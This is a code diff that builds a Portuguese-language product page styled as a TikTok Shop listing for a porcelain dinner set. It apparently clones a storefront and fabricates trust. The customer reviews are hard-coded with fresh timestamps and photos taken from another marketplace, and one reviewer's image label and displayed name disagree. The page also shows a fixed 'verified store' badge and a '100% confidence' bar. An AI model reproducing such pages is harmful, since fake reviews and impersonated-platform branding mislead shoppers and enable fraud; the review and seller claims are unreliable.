+      </svg>
+      Aplicado
+    </div>
+  </div>
+</div>
+
+  <!-- Tabs -->
+  <div class="flex border-b border-gray-200 text-sm font-medium space-x-6 mb-4" style="background-color: #fff!important; margin-top: 2em; display: none;">
+    <button class="relative px-4 py-2 text-black font-semibold tab-button tab-active" data-tab="tab1">
+      Visão geral
+    </button>
+    <button class="relative px-4 py-2 text-gray-500 hover:text-black tab-button" data-tab="tab2">
+      Descrição
+    </button>
+  </div>
+
+  <!-- Conteúdo das abas -->
+  <div id="tab1" class="tab-content">
+
+    <div class="max-w-md mx-auto bg-white p-4 rounded shadow" style="display: none;">
+      <div class="flex justify-between font-medium mb-2">
+        <span>Selecionar opções</span>
+        <span class="text-gray-500" style="font-size: 0.8em; color: #000;">Quantidade</span>
+      </div>
+
+      <div id="option-list" class="flex flex-wrap gap-2" style="justify-content: space-evenly;">
+
+        <div class="relative">
+          <!-- Opção ATIVA (disponível) -->
+          <button class="option-btn bg-emerald-400 text-white font-semibold px-4 py-2 rounded-md text-xs shadow" data-status="available">
+            262
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-gray-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Disponível</span>
+        </div>
+
+        <!-- Opções ESGOTADAS -->
+        <div class="relative">
+          <button class="option-btn bg-gray-100 text-gray-400 px-4 py-2 rounded-md text-xs cursor-not-allowed" data-status="soldout">
+            24
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-pink-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Esgotado</span>
+        </div>
+
+        <div class="relative">
+          <button class="option-btn bg-gray-100 text-gray-400 px-4 py-2 rounded-md text-xs cursor-not-allowed" data-status="soldout">
+            48
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-pink-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Esgotado</span>
+        </div>
+
+        <div class="relative">
+          <button class="option-btn bg-gray-100 text-gray-400 px-4 py-2 rounded-md text-xs cursor-not-allowed" data-status="soldout">
+            60
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-pink-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Esgotado</span>
+        </div>
+
+        <div class="relative">
+          <button class="option-btn bg-gray-100 text-gray-400 px-4 py-2 rounded-md text-xs cursor-not-allowed" data-status="soldout">
+            80
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-pink-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Esgotado</span>
+        </div>
+
+        <div class="relative">
+          <button class="option-btn bg-gray-100 text-gray-400 px-4 py-2 rounded-md text-xs cursor-not-allowed" data-status="soldout">
+            100
+          </button>
+          <span class="absolute -bottom-2 left-1/2 -translate-x-1/2 bg-pink-400 text-white text-[8px] px-2 py-0.5 rounded-full font-semibold">Esgotado</span>
+        </div>
+      </div>
+
+      <!-- Alerta HTML -->
+      <div id="alert-msg" class="mt-4 text-red-600 text-xs font-medium hidden">
+        Produto esgotado. Escolha uma opção disponível.
+      </div>
+    </div>
+
+    <script>
+      const buttonsx = document.querySelectorAll('.option-btn');
+      const alert = document.getElementById('alert-msg');
+
+      buttonsx.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+          const status = btn.getAttribute('data-status');
+
+          if (status === 'available') {
+            alert.classList.add('hidden');
+            // Remove seleção anterior
+            buttonsx.forEach(b => b.classList.remove('bg-emerald-400', 'text-white', 'font-semibold', 'shadow'));
+            // Aplica estilo de ativo
+            btn.classList.add('bg-emerald-600', 'text-white', 'font-semibold', 'shadow');
+          } else {
+            alert.classList.remove('hidden');
           }
-
-          requestAnimationFrame(animateCounter);
         });
+      });
+    </script>
 
-        function easeOutCubic(t) {
-          return 1 - Math.pow(1 - t, 3);
+<!-- SEÇÃO DE AVALIAÇÕES DOS CLIENTES -->
+<div class="bg-white p-4 rounded-lg shadow-sm">
+
+  <!-- CABEÇALHO -->
+  <div class="flex items-center justify-between mb-4">
+    <h2 class="text-lg font-bold text-gray-800">Avaliações dos clientes (207)</h2>
+  </div>
+
+  <!-- NOTA GERAL -->
+  <div class="flex items-center mb-4">
+    <span class="text-3xl font-bold text-gray-800">4.7</span>
+    <span class="text-lg text-gray-600 ml-2">/5</span>
+    <div class="ml-4 flex">
+      <div class="text-yellow-500 mb-2" style="display: flex;"><svg fill="#ffa500" height="24" viewBox="0 0 24 24" width="24" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="24" viewBox="0 0 24 24" width="24" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.24 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="24" viewBox="0 0 24 24" width="24" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="24" viewBox="0 0 24 24" width="24" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="24" viewBox="0 0 24 24" width="24" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg></div>    </div>
+  </div>
+
+  <!-- LISTA DE REVIEWS -->
+  <div class="space-y-4">
+
+    <!-- REVIEW 1 -->
+    <div class="bg-gray-50 p-4 rounded-lg">
+      <div class="flex items-start gap-3 mb-2">
+        <img src="https://down-br.img.susercontent.com/file/br-11134233-7r98o-lxafbqt9zp1ubf_tn" alt="Luh Moraes" class="w-10 h-10 rounded-full object-cover">
+        <div>
+          <p class="font-medium text-gray-800">Luh Moraes</p>
+          <p class="text-xs text-green-500">há 23 minutos</p>
+        </div>
+      </div>
+      <div class="text-yellow-500 mb-2" style="display: flex;"><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg></div>
+      <p class="text-sm text-gray-700 mb-2">Gente estou muito apaixonada, esse conjunto é maravilhoso! Faz muito tempo que estou namorando esse kit, encontrei na loja o melhor custo benefício, veio bem embalado, e a entrega foi super rápida. Nota 1000
+</p>
+      <div class="flex gap-2 flex-wrap">
+        <video src="https://down-zl-br.vod.susercontent.com/api/v4/11110103/mms/br-11110103-6kfkr-lzou5smue535a2.16000051725282588.mp4" controls="" class="w-16 h-26 rounded-lg object-cover" controlslist="nodownload" autoplay=""></video>
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzou57e5h6bl46.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzou57e5ikw1bf.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzou57e5jzgh69.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzou57e5le0x50.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+      </div>
+    </div>
+
+    <!-- REVIEW 2 -->
+    <div class="bg-gray-50 p-4 rounded-lg">
+      <div class="flex items-start gap-3 mb-2">
+        
+        <img src="https://down-br.img.susercontent.com/file/03abd08ae7158565ba80932630ba9777_tn" alt="Carlos Albuquerque" class="w-10 h-10 rounded-full object-cover">
+        <div>
+          
+          <p class="font-medium text-gray-800">Sara Albuquerque</p>
+          <p class="text-xs text-green-500">há 41 minutos</p>
+        </div>
+      </div>
+      <div class="text-yellow-500 mb-2" style="display: flex;"><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg></div>
+      <p class="text-sm text-gray-700 mb-2">Aparelho de jantar perfeito! Todas as peças chegaram intactas e muito bem embaladas. É tudo muito lindo, fiquei apaixonada! Entrega rápida. 
+A única observação é que o prato fundo não é muito fundo, mas eu já tinha percebido pelas fotos.
+</p>
+      <div class="flex gap-2 flex-wrap">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzq1jtaepmhxe1.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzq1jtayotxx88.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzq1jtayotvlc1.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+      </div>
+    </div>
+
+    <!-- REVIEW 3 -->
+    <div class="bg-gray-50 p-4 rounded-lg">
+      <div class="flex items-start gap-3 mb-2">
+        <img src="images/menina3.jpg" alt="Elane Costa" class="w-10 h-10 rounded-full object-cover">
+        <div>
+          <p class="font-medium text-gray-800">Elane Costa</p>
+          <p class="text-xs text-green-500">há 50 minutos</p>
+        </div>
+      </div>
+      <div class="text-yellow-500 mb-2" style="display: flex;"><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg></div>
+      <p class="text-sm text-gray-700 mb-2">Conjunto lindo perfeito veio tudo direitinho entrega rápida tudo OK podem comprar sem medo
+
+</p>
+      <div class="flex gap-2 flex-wrap">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-m2l73rgw7bphcf.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-m2l73rgw8q9xb9.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-m2l73rgwa4ud5a.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+      </div>
+    </div>
+
+    <!-- REVIEW 4 -->
+    <div class="bg-gray-50 p-4 rounded-lg">
+      <div class="flex items-start gap-3 mb-2">
+        <img src="https://down-br.img.susercontent.com/file/br-11134233-7r98o-m1e5uqwy5n0gdf_tn" alt="Sofia Dias" class="w-10 h-10 rounded-full object-cover">
+        <div>
+          <p class="font-medium text-gray-800">Sofia Dias</p>
+          <p class="text-xs text-green-500">há 1 hora</p>
+        </div>
+      </div>
+      <div class="text-yellow-500 mb-2" style="display: flex;"><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg><svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg></div>
+      <p class="text-sm text-gray-700 mb-2">Que luxooooooo.<br>
+Estou apaixonada pelo jogo de jantar.<br>
+Chegaram na data prevista,sem nenhum problema, todas as peças foram muito bem embalado. <br>
+Eu ameiiii o cuidado e capricho com as peças</p>
+      <div class="flex gap-2 flex-wrap">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzgotacxf1qt93.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+        <img src="https://down-br.img.susercontent.com/file/br-11134103-7r98o-lzgotacxggb936.webp" alt="Foto da avaliação" class="w-16 h-16 rounded-lg object-cover">
+      </div>
+    </div>
+
+  </div>
+
+  <!-- FILTROS ESTATÍSTICOS -->
+  <div class="mt-6 flex flex-wrap gap-2">
+    <span class="bg-gray-100 text-gray-600 px-3 py-1 rounded-full text-xs flex items-center gap-1">
+      <svg fill="#666" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"></path>
+      </svg>
+      Inclui imagens ou vídeos (52)
+    </span>
+    <span class="bg-gray-100 text-gray-600 px-3 py-1 rounded-full text-xs flex items-center gap-1">
+      <span class="text-yellow-500">5</span>
+      <svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg>
+      (155)
+    </span>
+    <span class="bg-gray-100 text-gray-600 px-3 py-1 rounded-full text-xs flex items-center gap-1">
+      <span class="text-yellow-500">4</span>
+      <svg fill="#ffa500" height="14" viewBox="0 0 24 24" width="14" class="flex-shrink-0">
+        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+      </svg>
+      (22)
+    </span>
+  </div>
+
+</div>
+
+<div class="relative overflow-hidden bg-white rounded-2xl border border-gray-100 max-w-md mx-auto mt-8" style="margin-bottom:20px; margin-left:16px; margin-right: 16px;">
+  
+  <!-- Efeito de Gradiente Suave no Topo -->
+  <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-pink-500 to-rose-500"></div>
+  
+  <!-- Conteúdo Principal -->
+  <div class="p-5 flex items-center justify-between">
+    
+    <!-- Logo + Informações -->
+    <div class="flex items-center space-x-4 group">
+      <!-- Logo com Efeito 3D -->
+      <div class="relative">
+        <div class="w-14 h-14 rounded-full bg-gradient-to-br from-blue-50 to-blue-100 p-0.5">
+          <img src="https://down-br.img.susercontent.com/file/br-11134216-7r98o-lxmwyutaf5bz89@resize_w80_nl.webp" alt="JBL Eletronicos Tiktok Shops" class="w-full h-full rounded-full object-cover border-2 border-white shadow-sm transition-transform duration-300 group-hover:scale-105">
+        </div>
+        <!-- Badge de Verificação -->
+        <div class="absolute -bottom-1 -right-1 bg-blue-500 rounded-full p-1 shadow-md">
+          <svg class="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 20 20">
+            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
+          </svg>
+        </div>
+      </div>
+      
+      <!-- Nome e Produtos -->
+      <div class="flex flex-col">
+        <div class="flex items-center">
+          <p class="font-bold text-gray-800 text-sm tracking-tight">Amarinne Home</p>
+          <span class="ml-2 bg-blue-100 text-blue-600 text-xs px-2 py-0.5 rounded-full">Loja Verificada</span>
+        </div>
+        <p class="text-xs text-gray-500 flex items-center">
+          <span class="w-1.5 h-1.5 bg-green-400 rounded-full mr-1"></span>
+          1706 produtos • 100% recomenda
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Barra de Progresso Simbólica (Confiança) -->
+  <div class="px-5 py-2 bg-gray-50 border-t border-gray-100">
+    <div class="flex justify-between text-xs text-gray-500 mb-1">
+      <span>Confiança:</span>
+      <span>100%</span>
+    </div>
+    <div class="w-full bg-gray-200 rounded-full h-1.5">
+      <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-1.5 rounded-full" style="width: 100%"></div>
+    </div>
+  </div>
+</div>
+
+  <script>
+    const seguirBtn = document.getElementById('seguirBtn');
+    const key = 'seguiu_karla_bella';
+
+    // Carrega estado do localStorage
+    if (localStorage.getItem(key) === '1') {
+      seguirBtn.textContent = 'Seguindo';
+      seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+      seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+    }
+
+    seguirBtn.addEventListener('click', () => {
+      const seguindo = localStorage.getItem(key) === '1';
+
+      if (seguindo) {
+        localStorage.removeItem(key);
+        seguirBtn.textContent = 'Seguir';
+        seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+        seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+      } else {
+        localStorage.setItem(key, '1');
+        seguirBtn.textContent = 'Seguindo';
+        seguirBtn.classList.remove('bg-gray-100', 'text-gray-700');
+        seguirBtn.classList.add('bg-gray-100', 'text-gray-700');
+      }
+    });
+  </script>
+
+<!-- Adicione a CDN do Tailwind no head se ainda não estiver usando -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<!-- COMEÇA: Descrição do produto (estilo TikTok Shop) -->
+<section class="max-w-md mx-auto space-y-6">
+<!-- Card da descrição -->
+<article class="bg-white p-5 border border-gray-100 ">
+<h2 class="text-lg font-extrabold text-gray-900 tracking-tight">Aparelho De Jantar e Chá - Modelo Ryo Maresia 30 Peças - Oxford Porcelanas</h2>
+
+<!-- Subtitle / destaque -->
+<p class="mt-2 text-sm text-gray-600">O wabi-sabi é um conceito japonês que valoriza o imperfeito, do processo de criação até o seu acabamento. Exaltar o irregular, o impermanente e o incompleto é uma homenagem da linha Ryo à esta sabedoria japonesa. A coleção Ryo Maresia traz uma composição que valoriza a beleza das praias, o toque da areia e o frescor do mar.</p>
+
+<!-- Descrição (colapsável) -->
+<div id="descPreview" class="mt-3 text-sm text-gray-700 max-h-28 overflow-hidden transition-all duration-200" aria-hidden="false">
+  <p class="mb-2">
+    As peças do aparelho de jantar Ryo Maresia recebem aplicação de esmalte com pigmentação e de um filete reagente aplicado de forma manual garantindo a unicidade de cada peça. A coleção Ryo Maresia dispõe ainda de peças complementares, como canecas, travessas e tigelas para deixar sua mesa mais completa.
+  </p>
+
+</div>
+<!-- Itens inclusos -->
+<div class="mt-4 pt-4 border-t border-gray-100">
+  <h3 class="text-sm font-semibold text-gray-900">Itens Inclusos</h3>
+
+  <ul class="mt-3 space-y-2 text-sm text-gray-700">
+    <li class="flex items-start gap-3">
+      <svg class="w-5 h-5 flex-shrink-0 text-green-500 mt-0.5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 01.023 1.39l-7.5 8a1 1 0 01-1.43.042L3.293 10.7a1 1 0 011.414-1.414l3.268 3.268L15.3 5.32a1 1 0 01.023-1.414z" clip-rule="evenodd"></path>
+      </svg>
+      <span>06 Pratos Rasos - 27,5cm;</span>
+    </li>
+    <li class="flex items-start gap-3">
+      <svg class="w-5 h-5 flex-shrink-0 text-green-500 mt-0.5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 01.023 1.39l-7.5 8a1 1 0 01-1.43.042L3.293 10.7a1 1 0 011.414-1.414l3.268 3.268L15.3 5.32a1 1 0 01.023-1.414z" clip-rule="evenodd"></path>
+      </svg>
+      <span>06 Pratos Fundos - 22,5cm de diâmetro e 4,5 cm de altura;</span>
+    </li>
+    <li class="flex items-start gap-3">
+      <svg class="w-5 h-5 flex-shrink-0 text-green-500 mt-0.5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 01.023 1.39l-7.5 8a1 1 0 01-1.43.042L3.293 10.7a1 1 0 011.414-1.414l3.268 3.268L15.3 5.32a1 1 0 01.023-1.414z" clip-rule="evenodd"></path>
+      </svg>
+      <span>06 Pratos de Sobremesas - 21,5cm;</span>
+    </li>
+    <li class="flex items-start gap-3">
+      <svg class="w-5 h-5 flex-shrink-0 text-green-500 mt-0.5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 01.023 1.39l-7.5 8a1 1 0 01-1.43.042L3.293 10.7a1 1 0 011.414-1.414l3.268 3.268L15.3 5.32a1 1 0 01.023-1.414z" clip-rule="evenodd"></path>
+      </svg>
+      <span>06 Xícaras de Chá - 220ml.</span>
+    </li>
+    <li class="flex items-start gap-3">
+      <svg class="w-5 h-5 flex-shrink-0 text-green-500 mt-0.5" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
+        <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 01.023 1.39l-7.5 8a1 1 0 01-1.43.042L3.293 10.7a1 1 0 011.414-1.414l3.268 3.268L15.3 5.32a1 1 0 01.023-1.414z" clip-rule="evenodd"></path>
+      </svg>
+      <span>06 Pires de Chá - 16cm;</span>
+    </li>
+  </ul>
+</div>
+
+<!-- Especificações -->
+<div class="mt-4 pt-4 border-t border-gray-100">
+  <h3 class="text-sm font-semibold text-gray-900">Especificações</h3>
+        <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw8yk900.webp" alt="Imagem 5"></div>
+        <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw3cahdd.webp" alt="Imagem 6"></div>
+</div>
+
+<!-- Destaques -->
+<div class="mt-4 pt-4 border-t border-gray-100">
+  <h3 class="text-sm font-semibold text-gray-900">Por que escolher o Aparelho de Jantar e Chá Ryo Maresia 30 Peças - Oxford?</h3>
+  <ul class="mt-3 space-y-2 text-sm text-gray-700">
+    <li>✅ Porcelana Premium Oxford – resistente e com acabamento perfeito</li>
+    <li>✅ Wabi-sabi japonês – cada peça única, feita à mão</li>
+    <li>✅ Design Maresia – traz praia, areia e mar para sua mesa</li>
+    <li>✅ 100% micro-ondas e lava-louças – prático todo dia</li>
+    <li>✅ Conjunto completo: 6 rasos 27,5cm, 6 fundos, 6 sobremesa, 6 xícaras 220ml + 6 pires</li>
+    <li>✅ Garantia 90 dias + fabricado no Brasil</li>
+  </ul>
+</div>
+
+  <!-- Envio -->
+  <div class="mt-4 pt-4 border-t border-gray-100">
+    <p class="text-sm text-gray-700">🚚 Envio rápido e seguro para todo o Brasil. Aproveite essa oferta e leve a experiência Tiktok Shop para o seu dia a dia!</p>
+  </div>
+  <div class="flex justify-center space-x-4 mb-4" bis_skin_checked="1" style="margin-bottom: 100px; margin-top: 40px;">
+      <a href="#" class="hover:opacity-90 transition">
+        <img src="https://freepnglogo.com/images/all_img/1714299055tiktok-shop-logo-png.png" class="h-8" alt="Google Play">
+      </a>
+    </div>
+</article>
+
+
+<!-- Estilos necessários para remover o marcador nativo (infelizmente, isso ainda requer CSS) -->
+<!-- Se você PODE adicionar um bloco <style>: -->
+<style>
+  /* Necessário para remover o marcador nativo do <details> */
+  details summary::-webkit-details-marker { display: none; }
+  details summary { list-style: none; }
+</style>
+
+<!-- Estilos extras (rotaciona chevron quando <details> está aberto e remove marcador padrão) -->
+<style>
+  details summary::-webkit-details-marker { display: none; }
+  details summary { list-style: none; }
+  details summary svg { transform-origin: center; }
+  details[open] summary svg { transform: rotate(180deg); }
+</style>
+
+<!-- Script: toggle "Ver mais" e acessibilidade -->
+<script>
+  (function () {
+    const desc = document.getElementById('descPreview');
+    const btn = document.getElementById('toggleDescBtn');
+
+    btn.addEventListener('click', function () {
+      const isCollapsed = desc.classList.contains('max-h-28');
+      if (isCollapsed) {
+        desc.classList.remove('max-h-28');
+        desc.classList.add('max-h-full');
+        btn.textContent = 'Ver menos';
+        btn.setAttribute('aria-expanded', 'true');
+      } else {
+        desc.classList.add('max-h-28');
+        desc.classList.remove('max-h-full');
+        btn.textContent = 'Ver mais';
+        btn.setAttribute('aria-expanded', 'false');
+        // rola para garantir leitura (opcional)
+        desc.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }
+    });
+  })();
+</script>
+
+<!-- Footer Fixo (Estilo TikTok Shop Oficial) -->
+<div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-md px-4 py-2 flex items-center justify-between z-50">
+  
+  <!-- Ícones lado esquerdo -->
+  <div class="flex items-center gap-6">
+    <!-- Loja -->
+    <div class="flex flex-col items-center text-xs text-gray-600">
+      <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 mb-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3"></path>
+      </svg>
+      <span class="text-xs">Loja</span>
+    </div>
+
+    <!-- Chat -->
+    <div class="flex flex-col items-center text-xs text-gray-600">
+      <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 mb-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M21 12c0 4.418-4.03 8-9 8a9.77 9.77 0 01-3.39-.57l-4.5 1.07 1.08-3.24C4.37 15.93 3 14.08 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
+      </svg>
+      <span class="text-xs">Chat</span>
+    </div>
+  </div>
+
